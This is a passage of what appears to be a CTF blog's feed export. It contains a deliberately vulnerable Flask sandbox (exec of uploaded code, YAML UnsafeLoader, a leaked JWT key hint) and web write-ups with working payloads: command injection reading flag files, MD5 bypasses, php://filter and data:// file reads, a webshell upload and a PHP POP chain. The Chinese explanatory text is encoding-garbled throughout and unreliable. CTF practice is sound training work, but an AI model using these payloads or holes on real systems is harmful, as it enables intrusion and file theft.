#sandbox-container &#123; margin-top: 30px; &#125;</span><br><span class="hljs-string">        select, input, button &#123; font-size: 16px; margin: 10px; padding: 8px; border-radius: 6px; border: 1px solid #ccc; &#125;</span><br><span class="hljs-string">        #result &#123; background: #222; color: #0f0; padding: 15px; width: 80%; margin: 20px auto; white-space: pre-wrap; border-radius: 8px; text-align: left; &#125;</span><br><span class="hljs-string">        button &#123; background-color: #4CAF50; color: white; border: none; cursor: pointer; &#125;</span><br><span class="hljs-string">        button:hover &#123; background-color: #45a049; &#125;</span><br><span class="hljs-string">        input[type=&quot;file&quot;] &#123; display: block; margin: 10px auto; &#125;</span><br><span class="hljs-string">    &lt;/style&gt;</span><br><span class="hljs-string">&lt;/head&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">    &lt;div id=&quot;user-info&quot;&gt;Loading user info...&lt;/div&gt;</span><br><span class="hljs-string">    &lt;div id=&quot;sandbox-container&quot;&gt;</span><br><span class="hljs-string">        &lt;select id=&quot;mode&quot;&gt;</span><br><span class="hljs-string">            &lt;option value=&quot;yaml&quot; selected&gt;YAML&lt;/option&gt;</span><br><span class="hljs-string">            &lt;option value=&quot;python&quot;&gt;Python&lt;/option&gt;</span><br><span class="hljs-string">        &lt;/select&gt;</span><br><span class="hljs-string">        &lt;br&gt;</span><br><span class="hljs-string">        &lt;input type=&quot;file&quot; id=&quot;codefile&quot;&gt;</span><br><span class="hljs-string">        &lt;br&gt;</span><br><span class="hljs-string">        &lt;button onclick=&quot;runCode()&quot;&gt;â–¶ Execute from File&lt;/button&gt;</span><br><span class="hljs-string">        &lt;pre id=&quot;result&quot;&gt;Waiting for output...&lt;/pre&gt;</span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">    &lt;script&gt;</span><br><span class="hljs-string">        let token = &quot;&quot;;</span><br><span class="hljs-string">        fetch(&quot;/auth&quot;)</span><br><span class="hljs-string">            .then(res =&gt; res.json())</span><br><span class="hljs-string">            .then(data =&gt; &#123;</span><br><span class="hljs-string">                token = data.token;</span><br><span class="hljs-string">                const payload = JSON.parse(atob(token.split(&#x27;.&#x27;)[1]));</span><br><span class="hljs-string">                document.getElementById(&quot;user-info&quot;).innerHTML =</span><br><span class="hljs-string">                    &quot;&lt;span style=&#x27;color:#444&#x27;&gt;ğŸ‘¤ &quot; + payload.username + &quot;&lt;/span&gt; | &quot; +</span><br><span class="hljs-string">                    &quot;&lt;span style=&#x27;color:#4CAF50&#x27;&gt;Role: &quot; + payload.role + &quot;&lt;/span&gt;&quot;;</span><br><span class="hljs-string">            &#125;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">        function runCode() &#123;</span><br><span class="hljs-string">            const fileInput = document.getElementById(&#x27;codefile&#x27;);</span><br><span class="hljs-string">            const mode = document.getElementById(&quot;mode&quot;).value;</span><br><span class="hljs-string"></span><br><span class="hljs-string">            if (fileInput.files.length === 0) &#123;</span><br><span class="hljs-string">                document.getElementById(&quot;result&quot;).textContent = &#x27;&#123;&quot;error&quot;: &quot;Please select a file to upload.&quot;&#125;&#x27;;</span><br><span class="hljs-string">                return;</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string">            const file = fileInput.files[0];</span><br><span class="hljs-string"></span><br><span class="hljs-string">            const formData = new FormData();</span><br><span class="hljs-string">            formData.append(&#x27;codefile&#x27;, file);</span><br><span class="hljs-string">            formData.append(&#x27;mode&#x27;, mode);</span><br><span class="hljs-string"></span><br><span class="hljs-string">            fetch(&quot;/sandbox&quot;, &#123;</span><br><span class="hljs-string">                method: &quot;POST&quot;,</span><br><span class="hljs-string">                headers: &#123;</span><br><span class="hljs-string">                    &quot;Authorization&quot;: &quot;Bearer &quot; + token</span><br><span class="hljs-string">                &#125;,</span><br><span class="hljs-string">                body: formData</span><br><span class="hljs-string">            &#125;)</span><br><span class="hljs-string">            .then(res =&gt; res.json())</span><br><span class="hljs-string">            .then(data =&gt; &#123;</span><br><span class="hljs-string">                document.getElementById(&quot;result&quot;).textContent = JSON.stringify(data, null, 2);</span><br><span class="hljs-string">            &#125;);</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &lt;/script&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template_string(HTML_PAGE)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/auth&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">auth</span>():<br>    <span class="hljs-comment"># é»˜è®¤åˆ†å‘ä¸€ä¸ªä½æƒé™çš„ &#x27;user&#x27; token</span><br>    token = jwt.encode(&#123;<span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;guest&#x27;</span>, <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;user&#x27;</span>&#125;, JWT_SECRET, algorithm=JWT_ALGO)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(token, <span class="hljs-built_in">bytes</span>):<br>        token = token.decode()<br><br>    <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;token&#x27;</span>: token&#125;)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_code_safe</span>(<span class="hljs-params">code: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">any</span>(word <span class="hljs-keyword">in</span> code <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> FORBIDDEN)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/sandbox&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sandbox</span>():<br>    auth_header = request.headers.get(<span class="hljs-string">&#x27;Authorization&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> auth_header.startswith(<span class="hljs-string">&#x27;Bearer &#x27;</span>):<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;Invalid token format&#x27;</span>&#125;), <span class="hljs-number">401</span><br>    token = auth_header.replace(<span class="hljs-string">&#x27;Bearer &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;codefile&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;No file part in the request&#x27;</span>&#125;), <span class="hljs-number">400</span><br><br>    file = request.files[<span class="hljs-string">&#x27;codefile&#x27;</span>]<br>    <span class="hljs-keyword">if</span> file.filename == <span class="hljs-string">&#x27;&#x27;</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;No file selected&#x27;</span>&#125;), <span class="hljs-number">400</span><br><br>    mode = request.form.get(<span class="hljs-string">&#x27;mode&#x27;</span>, <span class="hljs-string">&#x27;python&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        code = file.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">f&#x27;Could not read or decode file: <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>&#125;), <span class="hljs-number">400</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">all</span>([token, code, mode]):<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;Token, code, or mode is empty&#x27;</span>&#125;), <span class="hljs-number">400</span><br><br>    <span class="hljs-keyword">try</span>:<br>        payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGO])<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        partial_key = JWT_SECRET[:-<span class="hljs-number">2</span>]<br>        <span class="hljs-keyword">return</span> &#123;<br>            <span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;JWT Decode Failed. Key Hint&#x27;</span>,<br>            <span class="hljs-string">&#x27;hint&#x27;</span>: <span class="hljs-string">f&#x27;Key starts with &quot;<span class="hljs-subst">&#123;partial_key&#125;</span>**&quot;. The 2 missing chars are alphanumeric (letters and numbers).&#x27;</span><br>        &#125;, <span class="hljs-number">500</span><br><br>    <span class="hljs-keyword">if</span> payload.get(<span class="hljs-string">&#x27;role&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;Permission Denied: admin only&#x27;</span>&#125;, <span class="hljs-number">403</span><br><br>    <span class="hljs-keyword">if</span> mode == <span class="hljs-string">&#x27;python&#x27;</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_code_safe(code):<br>            <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;forbidden keyword detected&#x27;</span>&#125;, <span class="hljs-number">400</span><br>        <span class="hljs-keyword">try</span>:<br>            scope = &#123;&#125;<br>            <span class="hljs-built_in">exec</span>(code, scope)<br>            result = scope[<span class="hljs-string">&#x27;run&#x27;</span>]()<br>            <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;result&#x27;</span>: result&#125;<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-built_in">str</span>(e)&#125;, <span class="hljs-number">500</span><br><br>    <span class="hljs-keyword">elif</span> mode == <span class="hljs-string">&#x27;yaml&#x27;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            obj = yaml.load(code, Loader=yaml.UnsafeLoader)<br>            <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;result&#x27;</span>: <span class="hljs-built_in">str</span>(obj)&#125;<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-built_in">str</span>(e)&#125;, <span class="hljs-number">500</span><br><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;invalid mode&#x27;</span>&#125;, <span class="hljs-number">400</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br>```<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LilCTF2025</title>
    <link href="/2025/08/20/LilCTF2025/"/>
    <url>/2025/08/20/LilCTF2025/</url>
    
    <content type="html"><![CDATA[<p>Updatingâ€¦</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GeekChallenge2024</title>
    <link href="/2025/08/16/GeekChallenge2024/"/>
    <url>/2025/08/16/GeekChallenge2024/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="100-çš„âšª"><a href="#100-çš„âšª" class="headerlink" title="100%çš„âšª"></a>100%çš„âšª</h2><p>æŸ¥çœ‹æºç ï¼Œæ£€ç´¢atobï¼Œå‘ç°<code>atob(&quot;U1lDezVVY0hfQF9XbzBkM3JmVWxfQ2lSYzFlfQ==&quot;)</code>ï¼Œæ§åˆ¶å°ç›´æ¥è¿è¡Œæˆ–ç›´æ¥å°†base64å­—ç¬¦ä¸²è§£ç </p><h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>phpç‰ˆæœ¬é—®é¢˜ï¼Œç›¸åŒè„šæœ¬ï¼Œååºåˆ—åŒ–åå¤šäº†4ä¸ªå­—ç¬¦</p><h2 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby_upload"></a>baby_upload</h2><p>ç¬¬äºŒä¸ª<code>.php</code>åç¼€ä¸ä¼šè¢«wafï¼Œä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œæ–‡ä»¶åè®¾ç½®ä¸º<code>shell.jpg.php</code>ï¼Œä¸Šä¼ æˆåŠŸï¼Œç›´æ¥è¿›è¡Œrce</p><h2 id="Problem-On-My-Web"><a href="#Problem-On-My-Web" class="headerlink" title="Problem_On_My_Web"></a>Problem_On_My_Web</h2><p>ç›´æ¥è®¿é—®èƒ½å¤Ÿæ‹¿åˆ°cookieï¼Œä½†æ˜¯check urlå¹¶æ²¡æœ‰è§¦å‘xss</p><h2 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h2><p>å·²ç»èµ°åˆ°äº†evalä½†æ˜¯æ— æ³•rce</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pikachu</title>
    <link href="/2025/08/12/pikachu/"/>
    <url>/2025/08/12/pikachu/</url>
    
    <content type="html"><![CDATA[<p>Updatingâ€¦</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DVWA</title>
    <link href="/2025/08/10/DVWA/"/>
    <url>/2025/08/10/DVWA/</url>
    
    <content type="html"><![CDATA[<p>Updatingâ€¦</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BaseCTF2024</title>
    <link href="/2025/08/06/BaseCTF2024/"/>
    <url>/2025/08/06/BaseCTF2024/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="å–µå–µå–µÂ´â€¢ï»Œâ€¢"><a href="#å–µå–µå–µÂ´â€¢ï»Œâ€¢" class="headerlink" title="å–µå–µå–µÂ´â€¢ï»Œâ€¢&#96;"></a>å–µå–µå–µÂ´â€¢ï»Œâ€¢&#96;</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">payload: url/?DT=<span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;cat /f*&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="MD5ç»•è¿‡æ¬¸"><a href="#MD5ç»•è¿‡æ¬¸" class="headerlink" title="MD5ç»•è¿‡æ¬¸"></a>MD5ç»•è¿‡æ¬¸</h3><p>ç¬¬ä¸€ä¸ªåˆ¤æ–­ä¸ºmd5å¼±ç±»å‹æ¯”è¾ƒï¼Œç›´æ¥ç”¨0eç»•è¿‡</p><p>ç¬¬äºŒä¸ªåˆ¤æ–­ç›´æ¥ç”¨æ•°ç»„ç»•è¿‡</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">payloadï¼šurl/?<span class="hljs-attribute">name</span>=QNKCDZO&amp;name2[]=1<br>postä¼ ï¼š<span class="hljs-attribute">password</span>=240610708&amp;password2[]=2<br></code></pre></td></tr></table></figure><h3 id="HTTPæ˜¯ä»€ä¹ˆå‘€"><a href="#HTTPæ˜¯ä»€ä¹ˆå‘€" class="headerlink" title="HTTPæ˜¯ä»€ä¹ˆå‘€"></a>HTTPæ˜¯ä»€ä¹ˆå‘€</h3><p>å®Œæ•´æ•°æ®åŒ…</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/?basectf=we1c%2500me</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>gz.imxbt.cn:20996<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Base<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>11<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://gz.imxbt.cn:20996<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>Base<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>c00k13=i can&#x27;t eat it<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br><span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><br><span class="language-abnf"><span class="hljs-attribute">Base</span><span class="hljs-operator">=</span>fl%<span class="hljs-number">40</span>g</span><br></code></pre></td></tr></table></figure><p>é‡æ”¾åæ‹¿åˆ°base64åŠ å¯†çš„flag</p><h3 id="ADarkRoom"><a href="#ADarkRoom" class="headerlink" title="ADarkRoom"></a>ADarkRoom</h3><p>ctrl+uæŸ¥çœ‹æºç ï¼Œctrl+fæŸ¥æ‰¾flag</p><h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p>æ²¡æœ‰ä»»ä½•wafï¼Œç›´æ¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œä¸Šä¼ æˆåŠŸåä¼šç»™å‡ºæºç ï¼Œä»æºç å¯çŸ¥æ–‡ä»¶ä¿å­˜åœ¨uploads&#x2F;ç›®å½•ä¸‹ï¼Œè®¿é—®ç›´æ¥è¿›è¡Œrce</p><h3 id="Auraé…±çš„ç¤¼ç‰©"><a href="#Auraé…±çš„ç¤¼ç‰©" class="headerlink" title="Auraé…±çš„ç¤¼ç‰©"></a>Auraé…±çš„ç¤¼ç‰©</h3><p>ç¬¬ä¸€ä¸ªåˆ¤æ–­å¯¹ä¼ å…¥çš„penå‚æ•°çš„å†…å®¹è¿›è¡Œæ£€æŸ¥ï¼Œè¦æ±‚ä»æ–‡ä»¶ä¸­è¯»å–çš„å†…å®¹ä¸ºAuraï¼Œç›´æ¥ç”¨<code>data://</code>ä¼ªåè®®ä¼ å…¥</p><p>ç¬¬äºŒã€ä¸‰ä¸ªåˆ¤æ–­å¯¹ä¼ å…¥challengeå‚æ•°è¿›è¡Œæ£€æŸ¥ï¼Œç¬¬äºŒä¸ªåˆ¤æ–­è¦æ±‚challengeå‚æ•°æ˜¯ä»¥<code>http://jasmineaura.github.io</code>å¼€å¤´ï¼Œä½†æ˜¯åœ¨è¿›è¡Œç¬¬ä¸‰ä¸ªåˆ¤æ–­å‰ä¼šæœ‰ä¸€ä¸ª<code>file_get_contents(challenge)</code>ä¼šè¿œç¨‹è¯¥åšå®¢çš„å†…å®¹ï¼Œå¹¶è¦æ±‚å†…å®¹ä¸­åŒ…å«<code>å·²ç»æ”¶åˆ°Kengwangçš„ç¤¼ç‰©å•¦</code>ï¼Œè¿™é‡Œç”¨<code>@</code>è¿›è¡Œæˆªæ–­</p><p>æœ€åæ˜¯è¢«åŒ…å«çš„giftå‚æ•°ï¼Œç»“åˆæç¤ºâ€œç¤¼ç‰©åœ¨flag.phpä¸­â€ï¼Œä½¿ç”¨<code>php://filter</code>ä¼ªåè®®å°†flagè¯»å‡º</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">postä¼ ï¼špen=data:<span class="hljs-regexp">//</span>text/plain,Aura&amp;challenge=http:<span class="hljs-regexp">//</span>jasmineaura.github.io<span class="hljs-variable">@127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>&amp;gift=php:<span class="hljs-regexp">//</span>filter/<span class="hljs-keyword">read</span>=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="EZ-ser"><a href="#EZ-ser" class="headerlink" title="EZ_ser"></a>EZ_ser</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">re</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$chu0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;chu0))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I can not believes!&quot;</span>;<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;chu0-&gt;<span class="hljs-variable">$nononono</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">web</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$kw</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dt</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;lalalla&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;kw;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ALL Done!&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pwn</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dusk</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$over</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;dusk != <span class="hljs-string">&quot;gods&quot;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ä»€ä¹ˆï¼Œä½ ç«Ÿæ•¢ä¸è®¤å¯?&quot;</span>;<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;over-&gt;<span class="hljs-title function_ invoke__">getflag</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Misc</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nothing</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;happy happy happy!&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are over!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$ser</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ser&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>popé“¾</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">web<span class="hljs-punctuation">#</span><span class="hljs-keyword">__wakup</span><span class="hljs-params">()</span>==&gt;re<span class="hljs-punctuation">#</span><span class="hljs-keyword">__toString</span><span class="hljs-params">()</span>==&gt;pwn<span class="hljs-punctuation">#</span><span class="hljs-keyword">__get</span><span class="hljs-params">()</span>==&gt;Misc<span class="hljs-punctuation">#</span><span class="hljs-keyword">getflag</span><span class="hljs-params">()</span><br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span 